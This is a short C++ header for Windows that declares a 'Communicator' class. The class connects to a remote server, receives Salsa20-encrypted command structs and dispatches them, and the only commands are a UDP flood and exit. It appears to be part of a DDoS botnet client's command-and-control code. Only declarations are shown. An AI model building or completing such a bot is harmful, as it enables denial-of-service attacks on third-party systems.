#pragma once
#include <WS2tcpip.h>
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#include <vector>

#include "flooder.h"
#include "salsa20.h"

enum CommandType {
  kUDP = 0,
  kExit,
};

struct Command {
  DWORD command_type;
  CHAR param_string1[64];
  CHAR param_string2[64];
  CHAR param_string3[64];
  CHAR param_string4[64];
  DWORD param_dword1;
  DWORD param_dword2;
  DWORD param_dword3;
  DWORD param_dword4;
};

typedef Command* LPCOMMAND;

class Communicator {
 public:
  Communicator(LPSTR server_address, DWORD port, uint8_t key[32]);
  ~Communicator();
  DWORD Handler();

 private:
  inline CHAR* malloc_lpstr(DWORD size) {
    return (CHAR*)malloc(size * sizeof(CHAR));
  }

  DWORD ConnectToServer();
  DWORD ReceiveCommandFromServer(LPCOMMAND buffer);
  DWORD ParseCommand(LPCOMMAND command);

  LPSTR server_address_ = malloc_lpstr(16);
  DWORD port_ = 0;

  WSADATA wsadata_;
  SOCKET socket_to_communicate_ = NULL;

  uint8_t key_[32];
};